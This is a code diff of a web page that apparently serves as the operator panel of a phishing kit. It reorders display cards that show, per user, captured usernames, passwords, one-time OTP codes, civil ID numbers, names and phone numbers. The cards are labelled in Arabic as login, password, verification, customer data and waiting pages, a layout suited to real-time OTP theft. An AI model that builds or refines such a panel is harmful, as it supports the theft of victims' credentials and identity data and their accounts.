@@ -223,6 +223,7 @@
 <!-- Supabase data layer: single clean build (fixed syntax) -->
 <!-- Supabase data layer: stats fix -->
 <!-- Supabase data layer: civil merged sequential display -->
+<!-- Supabase data layer: customer-first journey cards -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.min.js"></script>
 <script>
 const SUPABASE_URL = 'https://gqcugugpigkfaihpaikt.supabase.co';
@@ -480,10 +481,10 @@ function selectUser(id) {
     }
     if (journeyBox) {
         const GROUPS = [
+            { page: /customer-details/i, title: 'بيانات العميل', keys: ['fullName', 'civilId', 'phone'] },
             { page: /access-username/i, title: 'صفحة الدخول', keys: ['demo-username', 'username', 'demo-civil-1', 'demo-civil-2'] },
             { page: /access-password/i, title: 'كلمة المرور', keys: ['demo-password', 'password'] },
             { page: /access-verification/i, title: 'التحقق (OTP)', keys: ['otp', 'code'] },
-            { page: /customer-details/i, title: 'بيانات العميل', keys: ['fullName', 'civilId', 'phone'] },
             { page: /access-waiting/i, title: 'صفحة الانتظار', keys: [] }
         ];
         const f = user.fields || {};
